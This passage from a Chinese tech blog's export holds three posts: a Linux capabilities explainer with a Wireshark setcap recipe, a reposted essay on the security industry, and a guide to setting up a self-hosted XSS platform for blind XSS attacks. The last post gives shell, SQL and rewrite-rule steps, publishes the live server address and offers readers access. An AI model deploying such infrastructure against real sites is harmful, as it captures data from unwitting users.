<p>这种依赖单一帐户执行特权操作的方式加大了系统的面临风险，而需要root权限的程序可能只是为了一个单一的操作，例如：绑定到特权端口、打开一个只有root权限可以访问的文件。某些程序可能有安全漏洞，而如果程序不是以root的权限运行，其存在的漏洞就不可能对系统造成什么威胁。</p>
<p>从2.1版开始，内核开发人员在Linux内核中加入了能力(capability)的概念。其目标是消除需要执行某些操作的程序对root帐户的依赖。从2.2版本的内核开始，这些代基本可以使用了，虽然还存在一些问题，但是方向是正确的。</p>
<h2 id="0x2-内核能力简介"><a href="#0x2-内核能力简介" class="headerlink" title="0x2 内核能力简介"></a>0x2 内核能力简介</h2><p>传统UNIX的信任状模型非常简单，就是“超级用户对普通用户”模型。在这种模型中，一个进程要么什么都能做，要么几乎什么也不能做，这取决于进程的UID。如果一个进程需要执行绑定到私有端口、加载/卸载内核模块以及管理文件系统等操作时，就需要完全的root权限。很显然这样做对系统安全存在很大的威胁。</p>
<p>UNIX系统中的SUID问题就是由这种信任状模型造成的。例如，一个普通用户需要使用ping命令。这是一个SUID命令，会以root的权限运行。而实际上这个程序只是需要RAW套接字建立必要ICMP数据包，除此之外的其它root权限对这个程序都是没有必要的。如果程序编写不好，就可能被攻击者利用，获得系统的控制权。</p>
<p>使用能力(capability)可以减小这种风险。系统管理员为了系统的安全可以剥夺root用户的能力，这样即使root用户也将无法进行某些操作。而这个过程又是不可逆的，也就是说如果一种能力被删除，除非重新启动系统，否则即使root用户也无法重新添加被删除的能力。</p>
<p>Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而CAP_SETUID表示用户能够修改进程用户身份的特权操作。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制。</p>
<p>在Capilities中，只有进程和可执行文件才具有能力，每个进程拥有三组能力集，分别称为cap_effective, cap_inheritable, cap_permitted(分别简记为:pE,pI,pP)：</p>
<blockquote>
<ol>
<li>cap_permitted表示进程所拥有的最大能力集；</li>
<li>cap_effective表示进程当前可用的能力集，可以看做是cap_permitted的一个子集</li>
<li>cap_inheitable则表示进程可以传递给其子进程的能力集。</li>
</ol>
</blockquote>
<p>系统根据进程的cap_effective能力集进行访问控制，cap_effective为cap_permitted的子集，进程可以通过取消cap_effective中的某些能力来放弃进程的一些特权。</p>
<p>可执行文件也拥有三组能力集，对应于进程的三组能力集，分别称为cap_effective, cap_allowed 和cap_forced（分别简记为fE,fI,fP）</p>
<blockquote>
<ol>
<li>cap_allowed表示程序运行时可从原进程的cap_inheritable中集成的能力集</li>
<li>cap_forced表示运行文件时必须拥有才能完成其服务的能力集</li>
<li>cap_effective则表示文件开始运行时可以使用的能力。</li>
</ol>
</blockquote>
<h2 id="0x3-Linux内核中Capabilities的实现机制"><a href="#0x3-Linux内核中Capabilities的实现机制" class="headerlink" title="0x3 Linux内核中Capabilities的实现机制"></a>0x3 Linux内核中Capabilities的实现机制</h2><p>Linux内核从2.2版本开始，就加进的Capabilities的概念与机制，并随着版本升高逐步得到改进。在linux中，root权限被分割成一下29中能力：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">CAP_CHOWN:</span>修改文件属主的权限</span><br><span class="line"><span class="symbol">CAP_DAC_OVERRIDE:</span>忽略文件的DAC访问限制</span><br><span class="line"><span class="symbol">CAP_DAC_READ_SEARCH:</span>忽略文件读及目录搜索的DAC访问限制</span><br><span class="line">CAP_FOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制</span><br><span class="line"><span class="symbol">CAP_FSETID:</span>允许设置文件的setuid位</span><br><span class="line"><span class="symbol">CAP_KILL:</span>允许对不属于自己的进程发送信号</span><br><span class="line"><span class="symbol">CAP_SETGID:</span>允许改变进程的组ID</span><br><span class="line"><span class="symbol">CAP_SETUID:</span>允许改变进程的用户ID</span><br><span class="line"><span class="symbol">CAP_SETPCAP:</span>允许向其他进程转移能力以及删除其他进程的能力</span><br><span class="line"><span class="symbol">CAP_LINUX_IMMUTABLE:</span>允许修改文件的IMMUTABLE和APPEND属性标志</span><br><span class="line"><span class="symbol">CAP_NET_BIND_SERVICE:</span>允许绑定到小于<span class="number">1024</span>的端口</span><br><span class="line"><span class="symbol">CAP_NET_BROADCAST:</span>允许网络广播和多播访问</span><br><span class="line"><span class="symbol">CAP_NET_ADMIN:</span>允许执行网络管理任务</span><br><span class="line"><span class="symbol">CAP_NET_RAW:</span>允许使用原始套接字</span><br><span class="line"><span class="symbol">CAP_IPC_LOCK:</span>允许锁定共享内存片段</span><br><span class="line"><span class="symbol">CAP_IPC_OWNER:</span>忽略IPC所有权检查</span><br><span class="line"><span class="symbol">CAP_SYS_MODULE:</span>允许插入和删除内核模块</span><br><span class="line"><span class="symbol">CAP_SYS_RAWIO:</span>允许直接访问/devport,<span class="meta-keyword">/dev/</span>mem,<span class="meta-keyword">/dev/</span>kmem及原始块设备</span><br><span class="line"><span class="symbol">CAP_SYS_CHROOT:</span>允许使用chroot()系统调用</span><br><span class="line"><span class="symbol">CAP_SYS_PTRACE:</span>允许跟踪任何进程</span><br><span class="line"><span class="symbol">CAP_SYS_PACCT:</span>允许执行进程的BSD式审计</span><br><span class="line"><span class="symbol">CAP_SYS_ADMIN:</span>允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</span><br><span class="line"><span class="symbol">CAP_SYS_BOOT:</span>允许重新启动系统</span><br><span class="line"><span class="symbol">CAP_SYS_NICE:</span>允许提升优先级及设置其他进程的优先级</span><br><span class="line"><span class="symbol">CAP_SYS_RESOURCE:</span>忽略资源限制</span><br><span class="line"><span class="symbol">CAP_SYS_TIME:</span>允许改变系统时钟</span><br><span class="line"><span class="symbol">CAP_SYS_TTY_CONFIG:</span>允许配置TTY设备</span><br><span class="line"><span class="symbol">CAP_MKNOD:</span>允许使用mknod()系统调用</span><br><span class="line"><span class="symbol">CAP_LEASE:</span>允许修改文件锁的FL_LEASE标志</span><br></pre></td></tr></table></figure>
<p>这些能力可以单独作为选项添加到进程的三个能力集合中去，为程序的权限控制提供更大的灵活性。</p>
<h2 id="0x4-wireshark-的非root权限启动问题"><a href="#0x4-wireshark-的非root权限启动问题" class="headerlink" title="0x4 wireshark 的非root权限启动问题"></a>0x4 wireshark 的非root权限启动问题</h2><p>从Linux中第一次启动Wireshark的时候，可能会觉得奇怪，为什么看不到任何一个网卡，比如eth0之类的。这是因为，直接访问这些设备需要 root权限。然后，我就用root权限去用了。当然，这是一个不好的做法。比如Gentoo中就会提示：WIRESHARK CONTAINS OVER ONE POINT FIVE MILLION LINES OF SOURCE CODE. DO NOT RUN THEM AS ROOT.</p>
<p>那怎么办呢？Wireshark的leader Gerald Combs指出，现在多数Linux发行版都开始实现对raw网络设备使用文件系统权限（能力） ，可以用这个途径从普通用户启动Wireshark。</p>
<p>具体方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.安装setcap,setcap 是libcap2-bin包的一部分，一般来说，这个包默认会已经装好。</span></span><br><span class="line">sudo apt-get install libcap2-bin</span><br><span class="line"><span class="comment">#2.创建Wireshark组。这一步在安装Wireshark的时候，也会完成。</span></span><br><span class="line"><span class="comment">#groupadd -g wireshark</span></span><br><span class="line"><span class="comment">#usermod -a -G wireshark &lt;自己的用户名&gt;</span></span><br><span class="line"><span class="comment">#chgrp wireshark /usr/bin/dumpcap</span></span><br><span class="line"><span class="comment">#chmod 4750 /usr/bin/dumpcap</span></span><br><span class="line"><span class="comment">#3.赋予权限。</span></span><br><span class="line">sudo <span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</span><br><span class="line"><span class="comment">#可以使用 getcap /usr/bin/dumpcap验证，输出应当是：/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip</span></span><br><span class="line"><span class="comment">#现在wireshark 就可以用普通用户身份启动了</span></span><br></pre></td></tr></table></figure>

<p>但是下面这个命令中的 eip后缀代表什么？ </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</span><br></pre></td></tr></table></figure>
<p>其实上面已经说过了，代表进程的三个能力集合</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">e</span>  -&gt;</span>  cap_effective</span><br><span class="line"><span class="function"><span class="title">i</span>   -&gt;</span>  cap_inheritable  </span><br><span class="line"><span class="function"><span class="title">p</span>  -&gt;</span>  cap_permitted</span><br></pre></td></tr></table></figure>



<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://www.andy-pearce.com/blog/posts/2013/Mar/file-capabilities-in-linux/" target="_blank" rel="noopener">http://www.andy-pearce.com/blog/posts/2013/Mar/file-capabilities-in-linux/</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>领先一代的技术</title>
    <url>/2020/04/24/%E9%A2%86%E5%85%88%E4%B8%80%E4%BB%A3%E7%9A%84%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p>本文是一篇转载文章，作者的焦虑正好和我的焦虑类似，但是受限于本人的文字功底水平，怕写出来也会词不达意，因此转载了作者的原文来进行自勉。</p>
<p><strong>日后需要花点时间多想一想我们到底比别人优势在哪里，怎么利用我们的优势做出有辨识度的安全能力，怎么增厚壁垒扩大优势</strong></p>
<a id="more"></a>

<p><strong>本文转载自公众号<a href="https://mp.weixin.qq.com/s/8wvKP9fn9Thvp-QofnBZUg" target="_blank" rel="noopener">白帽汇赵武</a></strong></p>
<p>我一直比较焦虑，这跟我们公司业绩有没有翻倍没关系，跟我们拿没拿到融资没关系，跟我们的产品日活增加了多少没关系，跟我们公司加了多少人更加没有关系，因为我总觉得我们的技术还没有完成领先一代的升级。朋友问我说，什么叫领先一代的技术？我还没来得及想答案，另外的朋友又补充问题说，你需要花多长时间来完成你眼里领先一代的技术？<br>整个行业又何止是我们公司如此，我认为整个国内的安全公司都存在这个问题，只是大家未必都这么焦虑罢了。在我看来大家都还没有领先一代的技术，不管每个网络安全细分领域的所谓龙头企业怎么说，其他的一些企业都会不服气的站出来说我也有，这是典型的窝里横。</p>
<p>这里一个较为明显的特征就是，当你提出一个技术指标，友商会快速跟进，但是你又没有很好的办法证明你是对的他是错的，而且用户也不具备辨别的能力。所以大家就是拼宣传拼广告，你也没有杀手锏证明只有你有别人没有，大家都跟狗皮膏药一样相互贴着，甩也甩不掉，后来就变成了凑指标凑功能耍流氓的安然无恙，谁也打不败谁。<br>一个行业好不好，其实有一个很明显的特诊：你PK的是技术参数还是对美好事物的描述。最初级的永远是说我支持多少数据指标，这恰恰是行业没有突破的比较明显的特诊。真正意义上最好的效果是在哪个强需求点上非你不可。我这么说大家可能觉得有点模糊，那我举几个目前的例子好了：有企业敢对光刻机的市场吹牛吗？有企业能批量交付完全自主产权的7nm芯片吗？有企业能够宣称自己能够从生态上替换微软吗？</p>
<p>这就是领先一代的特征，所有的PR在这种实力面前都是无效的，更明确的衡量指标是：抛开政策要求不说，纯基于市场选择行为，老百姓或者企业在采购上愿意选择谁。所以说，在芯片领域国外是领先国内一代的，但是Intel跟AMD之间就不存在这个跨越，谁都打不服谁。</p>
<p>我们很多的技术都是这样，尤其是集中在网络安全这个领域，乍一想应该是有明显的阶梯的，实际上大量的“将就”，技术指标上<br>打赢国内友商就行，所以大家也说网络安全市场内卷。这不是废话嘛，你做了一堆垃圾，都在国内作威作福，都在忽悠客户。对内各种硬气，对外各种软，有本事把战线拉到别人的地盘去，与最顶尖的技术做PK，在一个市场化更加明显的环境里，让市场选择你，这才是真本事，那才叫领先了，至于是不是领先国外技术一代倒也未必，但是领先国内技术一代那是比较肯定的了。<br>回到我们自身，我们花了很长时间在做数据积累，我们也一直在等待量变到质变，我今天还是坚持要持续做最精细的数据积累，但是我把期望降低，我认为数据积累的量未必会改变用户认知，因为用户根本无从分辨，而真正能让用户感知到的是一种体验。换句话说，用户根本不参与评判，用户只是认为我想要做什么事情，用了你的产品就产生了美好，用户根本不需要关注参数指标。比如普通用户用电脑，他们能感知电脑卡不卡，风扇吵不吵，程序是不是都能装上，价格是不是能接受，至于i7还是锐龙用户分辨不了也不关心。但是你要是换成龙芯，用户就能快速感知，因为连一些游戏都跑不起来。<br>其实我看到了行业内有很多非常优秀的人才，他们有超强的天赋，在很短时间内快速达到了其他人难以企及的高度。于是很多企业给他们抛来了橄榄枝，高薪高职位。我看着他们开上了豪车，住上了大房子，开始学会了品酒品茶品咖啡，开始有人告诉他们要学会管理，学会做商务，学会了各类事物。他们的努力和能力当然配得上所有的这一切，只可惜的是快速就忘记了他们也没有来得及完成一种跨越式的技术输出，他们活成了别人眼里的“精英”阶层。太多的可能带领大家完成技术创新的人，在现实生活的优越感中，迷失了方向，他们不清楚作为天选之子他们神圣的使命败给了糖衣炮弹。</p>
<p>要完成我说的这种领先，就必须完成跨越式的创新，而要完成这种跨越式的创新，需要几个基本的条件：一是具有坚定的信念和使命感的创始团队，纯商人性质注定是不行的；二是顶尖的人才梯队，能够完成创新能力的快速实现试错；三是足够多的资源投入，只有足够多的资本和社会资源才能够支持人才梯队和长周期的研发。这三个只是基本的前提条件，不是必然条件，剩下来的就是时间。</p>
<p>老一辈的顶级科学家们花了一辈子的时间去寻找答案，创造了历史，也只不过是沧海一粟，仅仅能够完成一片拼图而已，我们为什么还想去走捷径？我们再想想爱因斯坦这辈子也没告诉人类宇宙的边缘是什么，马斯克可能在生命终结的那一刻也没能看到火星城市的建立，但是他们已经完成的成就已经是有目共睹，他们的技术已经领先一代甚至是两代，他们的思维就跑得更远了。所以，回到开头，如果说要对这种革新式的技术做一个时间限定，我希望像林俊德院士那样在生命最后一刻还在找寻答案。你翻过了一个山头，一定就会想翻另一个山头，就如他所表现的那样，休息时也要坐着，他担心躺下就再也起不来了。</p>
<p>我焦虑的是，我的智商不是最高的那一批，我们的技术还没有完成绝对的领先优势，我们的人才梯队距离顶尖还有很大差距，那种天才式的人才甚至看不上网络安全这个市值还不到万亿规模的领域。但是我又真切地看到了历史的机遇，无论从行业技术角度来看，还是在全球竞争力的角度来看，我们看到了机会，我们也整理了一系列突破的点，我也相信我一年能够完成一两个点的攻坚，耐不住要攻坚的创新点还有上百个，终其一生未必能完成一个行业最好技术落地的最基础的产品或者工具。我希望我们的工具在全球安全从业人员人手一套，我希望我们的产品在所有IT企业作为基础的第一款了解和使用的安全软件，我们希望我们的平台能够像Google一样的伟大，网络安全从我们这里开始。</p>
<p>我认为还是有机会的，只要我们完成技术的第一次突破，一次能够清晰划分实力的那一次蜕变。我们有了方向，也有了一定的资本，只是我们在人才梯队方面痛不欲生。希望突破早日到来！</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>我的思考</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次xss平台的搭建</title>
    <url>/2016/04/20/%E8%AE%B0%E4%B8%80%E6%AC%A1xss%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>一直都在学xss，不过苦于没有xss平台啊，又不愿意去用别人的免费的xss平台（善于装x的人都这样！！！），所以就一直没有盲打实战的机会。近来这几天就寻思着在我vps上搭建一个，在搭建的过程中遇见了各种各样的问题啊，最后在我的好友yichin的帮助下，终于搞好啦，所以发篇博客记录一下，让想自己搭建xss平台的小伙伴们有个参考。</p>
<a id="more"></a>

<p>好啦，直接来干货：</p>
<p>首先你得有个虚拟主机，或者服务器什么的，这写基础设备就不在说啦。<br>然后去网上找一套xss源码，我用的是这一个,<a href="http://www.1937cn.net/?p=203" target="_blank" rel="noopener">点击下载</a><br>下载完了之后上传到我的vps，因为是本地是windows，服务器是ubuntu，所以用pscp传到服务器上。<br>然后需要给我的vps安装php5和mysql，安装过程就是一直按回车……命令如下</p>
<p>[shell]<br>sudo apt-get install php5       #安装php5<br>sudo apt-get install mysql-server      #安装mysql,注意设置密码，不要忘记了<br>sudo apt-get install phpmyadmin       #安装phpmyadmin<br>[/shell]</p>
<p>安装完成之后，需要看一下是否安装成功<br>具体操作如下</p>
<p>[shell]<br>sudo service apache2 start   #开启apache服务<br>cd  /var/www/html<br>echo “&lt;?php phpinfo();  ?&gt;” &gt;index.php<br>[/shell]</p>
<p>然后访问你的服务器：http://你的ip/index.php<br>如果出现一下界面，就说名你的php安装成功啦<br><a href="/uploads/2015/07/搜狗截图15年07月03日0101_1.png"><img class="alignnone size-full wp-image-204" src="/uploads/2015/07/搜狗截图15年07月03日0101_1.png" alt="搜狗截图15年07月03日0101_1" width="638" height="587" /></a><br>然后接下来就是在的/var/www/html文件夹下新建一个xss文件夹，然后修改xss文件的权限为755，把你的xss源码拷贝到这个文件夹下,然后解压一下</p>
<p>[shell]<br>cd  /var/www/html<br>mkdir  xss           #新建一个xss文件夹<br>sudo chomd  755  xss    #把文件夹权限改为755<br>cp  ~/xss.zip  .     #把上传到服务器的xss源码拷贝到xss目录下，具体的路径和文件名，以你的为准<br>unzip  xss.zip       #解压<br>[/shell]</p>
<p>然后大概有下面这些文件<br><a href="/uploads/2015/07/搜狗截图15年07月03日0124_2.png"><img class="alignnone size-full wp-image-206" src="/uploads/2015/07/搜狗截图15年07月03日0124_2.png" alt="搜狗截图15年07月03日0124_2" width="772" height="293" /></a><br>接下来看操作：<br>修改一下你的配置文件,按照下面的说明改</p>
<p>[shell]<br>sudo vim  config.php<br>[/shell]</p>
<p><a href="/uploads/2015/07/搜狗截图15年07月03日0139_4.png"><img class="alignnone size-full wp-image-209" src="/uploads/2015/07/搜狗截图15年07月03日0139_4.png" alt="搜狗截图15年07月03日0139_4" width="1212" height="349" /></a><br>然后就是数据库的配置啦，</p>
<p>[shell]<br>service mysql start    #开启mysql服务<br>mysql  -u root    -p    #连接一下数据库<br>[/shell]</p>
<p><a href="/uploads/2015/07/搜狗截图15年07月03日0157_6.png"><img class="alignnone size-full wp-image-213" src="/uploads/2015/07/搜狗截图15年07月03日0157_6.png" alt="搜狗截图15年07月03日0157_6" width="827" height="263" /></a><br>在我打箭头的地方数输入之前安装mysql数据库的时候设置的密码<br>接下来创建一个数据库</p>
<p>[shell]<br>creat database xssplatform  #创建一个名字为xssplatform的数据库，注意名字要和之前在配置文件中设置的一样<br>exit                        #退出mysql<br>mysql -u root  -p  xssplatform  &lt; /var/www/html/xss/xssplatform.sql   #导入sql文件到xssplatform数据库<br>use xssplatform    #用xssplatform 数据库<br>update  oc_module  SET code=REPLACE(code,’<a href="http://xsser.me&#39;,&#39;http://你的ip/xss&#39;" target="_blank" rel="noopener">http://xsser.me&#39;,&#39;http://你的ip/xss&#39;</a>)  #更新一下code的值<br>exit<br>[/shell]</p>
<p>然后，访问一下：<br><a href="/uploads/2015/07/搜狗截图15年07月03日0217_7.png"><img class="alignnone size-full wp-image-215" src="/uploads/2015/07/搜狗截图15年07月03日0217_7.png" alt="搜狗截图15年07月03日0217_7" width="805" height="729" /></a><br>让人欣喜若狂的页面终于出现了，但是却发现高兴的太早了，因为无法注册……<br>需要你修改点东西</p>
<p>[shell]<br>vim   /var/www/html/xss/config.php<br>[/shell]</p>
<p><a href="/uploads/2015/07/搜狗截图15年07月03日0222_8.png"><img class="alignnone size-full wp-image-217" src="/uploads/2015/07/搜狗截图15年07月03日0222_8.png" alt="搜狗截图15年07月03日0222_8" width="1015" height="247" /></a></p>
<p>这样修改之后，就可以注册了，如果想让别人有邀请码才可以注册，需要把这个再改过来<br><a href="/uploads/2015/07/搜狗截图15年07月03日0227_9.png"><img class="alignnone size-full wp-image-220" src="/uploads/2015/07/搜狗截图15年07月03日0227_9.png" alt="搜狗截图15年07月03日0227_9" width="779" height="523" /></a></p>
<p><a href="/uploads/2015/07/搜狗截图15年07月03日0228_10.png"><img class="alignnone size-full wp-image-221" src="/uploads/2015/07/搜狗截图15年07月03日0228_10.png" alt="搜狗截图15年07月03日0228_10" width="789" height="587" /></a></p>
<p><a href="/uploads/2015/07/搜狗截图15年07月03日0229_11.png"><img class="alignnone size-full wp-image-222" src="/uploads/2015/07/搜狗截图15年07月03日0229_11.png" alt="搜狗截图15年07月03日0229_11" width="919" height="539" /></a></p>
<p>访问了一下 <a href="http://107.170.200.129/xss/PTmW5y?1435861703" target="_blank" rel="noopener">http://107.170.200.129/xss/PTmW5y?1435861703</a> 发现404了，看了一下发现是地址重写的问题<br>操作如下：</p>
<p>[shell]<br>cd  /etc/apache2/mods-enabled     #进入apache2的配置项目录<br>ln -s  ../mods-available/rewrite.load  rewrite.load  #创建一个名字为rewrite.load 的文件，连接到../mods-available/rewrit.load 文件<br>ls  -al   #看一下是否创建成功<br>[/shell]</p>
<p>如果有红框里面的文件，就说明创建成功啦<br><a href="/uploads/2015/07/搜狗截图15年07月09日1631_1.png"><img class="alignnone size-full wp-image-225" src="/uploads/2015/07/搜狗截图15年07月09日1631_1.png" alt="搜狗截图15年07月09日1631_1" width="992" height="123" /></a><br>接下来在你的xss目录下新建一个.htaccess的文件，文件内容如下<br><a href="/uploads/2015/07/搜狗截图15年07月09日1634_2.png"><img class="alignnone size-full wp-image-226" src="/uploads/2015/07/搜狗截图15年07月09日1634_2.png" alt="搜狗截图15年07月09日1634_2" width="808" height="167" /></a><br>文件内容贴出来，大家直接复制吧</p>
<p>[shell]<br>&lt;IfModule mod_rewrite.c&gt;<br>RewriteEngine on<br>RewriteRule ^([0-9a-zA-Z]{6})$ index.php?do=code&amp;urlKey=$1<br>RewriteRule ^do/auth/(w+?)(/domain/([w.]+?))?$ index.php?do=do&amp;auth=$1&amp;domain=$3<br>RewriteRule ^register/(.<em>?)$ index.php?do=register&amp;key=$1<br>RewriteRule ^register-validate/(.</em>?)$ index.php?do=register&amp;act=validate&amp;key=$1<br>RewriteRule ^login$   xss/index.php?do=login<br>&lt;/IfModule&gt;<br>[/shell]</p>
<p>接下来连入数据库，把自己的这个用户的adminlevel的值设置为1，接下来你就是超级管理员啦，可以给好朋友发要邀请码了<br>如果你发现有没有发邀请码的功能，或者说不能用，拿应该是文件权限的问题<br>官方的解决办法是，将xss这个文件夹的拥有者设置为apache2的内置账号，然后给这个问价夹一个744的权限<br>但是遗憾来了，我的vps没有apache2的内建账号，我是这样干的</p>
<p>[shell]<br>chmod  -R  777   xss   #先把文件权限设置为777，设置为755是不行的，因为在第一次用某些功能的时候，会创建一些文件<br>####权限给的太大，这样是不太安全的，所以等到你把所有的功能都用一下，发现没有问题之后，再把权限改过来<br>chmod   -R 755  xss  #修改文件权限完成，<br>[/shell]</p>
<p>xss平台搭建就基本完成啦，可以去盲打了<br>我的xss平台的地址是： <a href="http://107.170.200.129/xss" target="_blank" rel="noopener">http://107.170.200.129/xss</a><br>欢迎大家在我这里注册使用，在下面给我留言就可以啦，我会把邀请码发给大家。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
</search>
